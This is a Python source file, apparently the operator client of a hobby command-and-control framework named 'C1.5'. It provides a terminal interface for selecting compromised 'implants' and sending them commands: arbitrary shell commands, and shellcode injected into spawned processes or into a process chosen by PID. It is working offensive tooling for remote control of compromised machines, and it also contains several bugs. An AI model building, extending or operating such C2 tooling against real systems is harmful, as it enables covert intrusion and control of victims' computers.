import os
import time
from enum import Enum
import json
import threading
from rich.text import Text
from textual.app import App, ComposeResult
from textual.widget import _BorderTitle
from textual.widgets import Static, TextLog, Input, DataTable, Label
from textual.containers import VerticalScroll, Vertical, Horizontal
from textual import events
import requests
import httpx
from os import _exit, name
import base64
import logging
import argparse
import click
from datetime import datetime
from flask import Flask, request, make_response
from modules import storage_structs, encryption
import asyncio
import queue

# Make the tui app global
global app

# Override the loggin so no console messages pop up
log = logging.getLogger('werkzeug')
log.disabled = True

def secho(text, file=None, nl=None, err=None, color=None, **styles):
   pass

def echo(text, file=None, nl=None, err=None, color=None, **styles):
   pass

click.echo = echo
click.secho = secho


listener = Flask("client_listener")
@listener.route("/update", methods=['POST'])
def update_tui():
    # queue up the update
    update_type = ""
    update_data = ""
    try:
        r_json = request.get_json()
        update_type = r_json["s_update_type"]
        update_data = r_json["update_data"]
    except:
        oops = 1
        return "0"

    # Add it to the update queue
    app.db.new_server_update = True
    app.db.server_updates.put({"update_type":update_type, "update_data":update_data})
    return "1"

# Start the TUI configuration
class ImplantList(VerticalScroll):
    pass
class ServerLog(VerticalScroll):
    def add_log(self, text):
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        self.mount(Label(f"{dt_string}: {text}"))
        self.scroll_end()

class CommandOutput(VerticalScroll):
    def err_cmd_doesnt_exist(self, cmd):
        self.mount(Label(f"ERROR: Command \'{' '.join(cmd)}\' doesn't exist"))
        self.scroll_end()
    def print(self, text):
        self.mount(Label(text))
        self.scroll_end()
    def err_generic(self, text):
        self.mount(Label(text))
        self.scroll_end()
class CommandInput(Input):
    def clear(self):
        self.value = ""
    def log_generic_error(self, text):
        self.app.get_widget_by_id("command_output").err_generic(text)
    def log_cmd_error(self, cmd):
        self.app.get_widget_by_id("command_output").err_cmd_doesnt_exist(cmd)
    def log_output(self, text):
        self.app.get_widget_by_id("command_output").print(text)
    def implant_selected(self):
        if self.app.db.selected_implant == "":
            self.value = ""
            self.log_generic_error(f"ERROR: No implant selected, please select and implant first.")
            return False
        return True
        
    def action_submit(self):
        # Parse the command
        to_parse = self.value.strip()
        args = ' '.join(to_parse.split())
        args = args.split(' ')

        # TODO: Check for length of commands when connected and not connected
        #       to an implant

        # If "exit"
        if args[0] == "exit":
            self.app.exit()
        # If "server info"
        elif args[0] == "server":
            if args[1] == "info":
                self.log_output(f"Currently connected to {self.app.db.server}:{self.app.db.port} as \'{self.app.db.operator_name}\'")
                self.clear()
                return
            else:
                self.log_cmd_error(args)
                self.clear()
                return
        # Send shellcode and inject it into a spawned process
        elif args[0] == "shellcode-spawn":
            # No implant selected
            if not self.implant_selected():
                return
            # Too long or too short
            if len(args) != 2:
                self.value = ""
                self.log_generic_error("ERROR: Please provide a file for the 'shellcode-spawn' command, ex: 'shellcode-spawn code.bin'.")
                return
            # Check if the file exists
            if not os.path.isfile(args[1]):
                self.value = ""
                self.log_generic_error("ERROR: The provided file doesn't exist.")
                return
            # The file exists, read it
            with open(args[1], "rb") as file:
                # Read it into a variable
                binary_data = file.read()
                # Send the command
                cmd_id = send_implant_command(self.app.db.server, self.app.db.port, self.app.db.operator_name,self.app.db.selected_implant, "CMD_SHELLCODE_SPAWN", binary_data)
                self.log_output(f"The command '{' '.join(args)}' with ID {cmd_id} has been sent to {self.app.db.selected_implant}.")
            self.value = ""
            return
        # Send shellcode to the selected implant and inject it into a process
        # specified by provided PID
        elif args[0] == "shellcode-inject":
            # No implant selected
            if not self.implant_selected():
                return
            # Too long
            if len(args) != 3:
                self.value = ""
                self.log_generic_error("ERROR: Please provide a file and a PID for the 'shellcode-inject' command, ex: 'shellcode-inject code.bin 918'.")
                return
            # Check if the file exists
            if not os.path.isfile(args[1]):
                self.value = ""
                self.log_generic_error("ERROR: The provided file doesn't exist.")
                return
            # The file exists, read it
            with open(args[1], "rb") as file:
                # Read it into a variable
                binary_data = file.read()
                # Pack the params
                params = (binary_data, args[2])
                # Send the command
                cmd_id = send_implant_command(self.app.db.server, self.app.db.port, self.app.db.operator_name,self.app.db.selected_implant, "CMD_SHELLCODE_INJECT", params)
                self.log_output(f"The command '{' '.join(args)}' with ID {cmd_id} has been sent to {self.app.db.selected_implant}.")
            self.value = ""
            return

        # Send a shell command to the selected implant
        elif args[0] == "shell":
            if not self.implant_selected():
                return
            if len(args) < 2:
                self.value = ""
                self.log_generic_error(f"ERROR: Please provide more than 1 arguments to the 'shell' function")
                return
            params = ' '.join(args[1:])
            cmd_id = send_implant_command(self.app.db.server, self.app.db.port, self.app.db.operator_name,self.app.db.selected_implant, "CMD_SHELL", params, debug=self.app) 
            self.log_output(f"The command '{' '.join(args)}' with ID {cmd_id} has been sent to {self.app.db.selected_implant}.")
            self.value = ""
            return
        # If "select IMPLANT_NAME"
        elif args[0] == "select":
        # Update the implant database
            get_updated_implant_db(
                    self.app.db.server,
                    self.app.db.port,
                    self.app
                )
            # If implant exists 
            if args[1] in self.app.db.implant_db:
                # If it is not connected, error and return
                if not self.app.db.implant_db[args[1]]["connected"]:
                    self.log_generic_error(f"ERROR: Implant '{args[1]}' is not connected to the server.")
                    self.clear()
                    return
                # Select it
                self.app.db.selected_implant = args[1]
                # Update the Border Title of the command output window
                self.app.get_child_by_id("command_output").border_title = f"Command Output - Connected to {args[1]}"
                # Update placeholder
                self.placeholder = f"Connected to {args[1]}"
                # Print log to command_output
                self.log_output(f"Successfully selected implant '{args[1]}'")
                self.clear()
                return
            # If it doesn't exist, log the error in command output
            else:
                self.log_generic_error(f"ERROR: {args[1]} is not a valid implant name.")
                self.clear()
                return
        else:
            self.log_cmd_error(args)
            self.clear()
            return



class Client(App):
    def __init__(self, *args, db, **kwargs):
        self.db = db
        super().__init__(*args, **kwargs)
    CSS_PATH = "client.css" 
    async def server_update_task(self):
        while True:
            await asyncio.sleep(3)
            if self.db.new_server_update == True:
                # Get the 
                s_update = self.db.server_updates.get()
                data = s_update["update_data"]
                if s_update["update_type"] == "NEW_IMPLANT":
                    new_imp = data
                    # Log the new implant
                    self.get_widget_by_id("server_logs").add_log(f"New implant {new_imp['name']} has connected to the C1.5 server.")
                    # Add it to local db
                    self.db.implant_db["new_imp.name"] = new_imp
                if s_update["update_type"] == "NEW_COMMAND_RESPONSE":
                    cmd_data = data["command"]
                    log_data = data
                    # Log the response
                    self.get_widget_by_id("command_output").print(f"Response from {cmd_data['implant_name']} for command {cmd_data['id']}\n{cmd_data['output']}")

                    

                self.db.new_server_update = False
    def on_mount(self):
        asyncio.create_task(self.server_update_task())
    def compose(self) -> ComposeResult:
        # Initialize the TUI
        with Horizontal():
            #implant_list = ImplantList(id="implant_list")
            #implant_list.border_title = "Implant List"
            #yield implant_list
            server_logs = ServerLog(id="server_logs")
            server_logs.border_title = "Server Logs"
            yield server_logs
            server_logs.add_log(f"Successfully connected to C1.5 server {self.db.server}:{self.db.port} as \'{self.db.operator_name}\'")
        command_output = CommandOutput(id="command_output")
        command_output.border_title = "Command Output - No Implant Selected"
        yield command_output
        yield CommandInput(placeholder="Input commands here, 'help' for available commands", id="command_input")

def print_server_response(response):
    print(response.text)

def get_updated_implant_db(server, port, app):
    # Endpoint would be at /admin/update/implant
    url = "/admin/update/implants"
    r_json = requests.get(f"{server}:{port}{url}").json()
    app.db.implant_db = r_json["implant_db"]

def get_updated_operator_db(server, port, app):
    # Endpoint would be at /admin/update/operators
    url = "/admin/update/operators"
    r_json = requests.get(f"{server}:{port}{url}").json()
    app.db.operator_db = json.loads(r_json["operator_db"])

def send_implant_command(server, port, op_name, implant_name, cmd_type, arguments, debug=""):
    # Generate command id
    cmd_id = encryption.id_generator(N=32)
    # Constant data
    data = {
           "username": op_name,
           "implant_name": implant_name,
           "cmd_type": cmd_type,
           "command_id": cmd_id
    }
    # Endpoint
    url = "/admin/management"
    # Parse out the type of implant command to determine what the arguments look like
    match cmd_type:
        case "CMD_SHELLCODE_SPAWN":
            b64_shellcode = encryption.base64.b64encode(arguments).decode('utf-8')
            files = {'shellcode_file': b64_shellcode}
            # Make the command string here
            cmd_string = storage_structs.command_to_str(cmd_type, cmd_id, b64_shellcode)
            try:
                x = requests.post(server+":"+port+url, json=data, files=files)
                if x.text == "1":
                    return cmd_id 
            except:
                app.get_child_by_id("command_output").err_generic("ERROR: Something went wrong with the implant command.")
                return "0"
        case "CMD_SHELLCODE_INJECT":
            # Base64 encode the contents
            b64_shellcode = encryption.base64.b64encode(arguments[0]).decode('utf-8')
            # Make the command string here
            cmd_string = storage_structs.command_to_str(cmd_type, cmd_id, b64_shellcode, arguments[1])
            data["arguments"] = cmd_string
            try:
                x = requests.post(server+":"+port+url, json=data)
                if x.text == "1":
                    return cmd_id 
            except:
                app.get_child_by_id("command_output").err_generic("ERROR: Something went wrong with the implant command.")
                return "0"
        case "CMD_SHELL":
            cmd_string = storage_structs.command_to_str(cmd_type, cmd_id, arguments)
            # Send a json object
            data["arguments"] = cmd_string
            try:
                x = requests.post(server+":"+port+url, json=data)
                if x.text == "1":
                    return cmd_id 
            except:
                app.get_child_by_id("command_output").err_generic("ERROR: Something went wrong with the implant command.")
                return "0"
    
def login(server, port, name, op_ip, op_port):
    data = {'username': name, "lip": op_ip, "lport": op_port}
    login_endpoint = "/admin/login"

    x = ""
    try:
        x = requests.post(server+login_endpoint, json=data)
        # If the name exists already
        if x.text == "0":
            print(f"There is already a {name} connected to {server}:{port}, please pick a different one.")
            _exit(1)
        if x is None:
            print("Not able to connect to the server, please verify the URL:port is correct and that the server is online.\nExiting now...")
            _exit(1)
        return x

    except:
        print("Not able to connect to the server, please verify the URL:port is correct and that the server is online.\nExiting now...")
        #_exit(1)

# Init argparse
def parse_initial_arguments():
    parser = argparse.ArgumentParser(
            prog='C1.5 Operator Client',
            description='Operator client for the C1.5 command and control framework')
    parser.add_argument('--server', help="The IP or domain of the C1.5 server you want to connect to.", required=True)
    parser.add_argument('--rport', help="The port of the C1.5 server you want to connect to.", required=True)
    parser.add_argument('--username', help="The username you want to login to the C1.5 server as", required=True)
    parser.add_argument('--lip', help="The IP you want the client to listen on for updates from the server", required=True)
    parser.add_argument('--lport', help="The port you want the client to listen on for updates from the server", required=True)
    args = parser.parse_args()
    return args

# Global data storage for the TUI, becomes a member of the Client() class
# Accessible globally
class instance_db:
    def __init__(self, server, port, operator_name, imp_db):
        self.server = server
        self.port = port
        self.operator_name = operator_name
        self.selected_implant = ""
        self.new_server_update = False
        self.server_updates = queue.Queue() 

        # Use the shared class that is defined for both the server and client
        # The functions within wont be used, just to sync the storage between
        # the client and server easily
        self.implant_db = imp_db
if __name__ == "__main__":
    args = parse_arguments()
    operator_name = args.username
    server = "http://"+args.server
    port = args.rport
    listen_port = args.lport
    listen_ip = args.lip

    # Attempt to sign in to the C1.5 server with a POST request
    login_response = login(server, port, operator_name, listen_ip, listen_port)
    # login_response should have json in it
    login_json = {}
    try:
        login_json = login_response.json()
    except:
        _exit(1)
    # pull out implant_db
    imp_db = login_json["implant_db"]
    # sync the databases initially
    # start the listener 
    app = Client(db=instance_db(server,port,operator_name, imp_db))
    
    server_thread = threading.Thread(target=lambda: listener.run(host=listen_ip, port=listen_port, debug=False, use_reloader=False)).start()
    app.run()
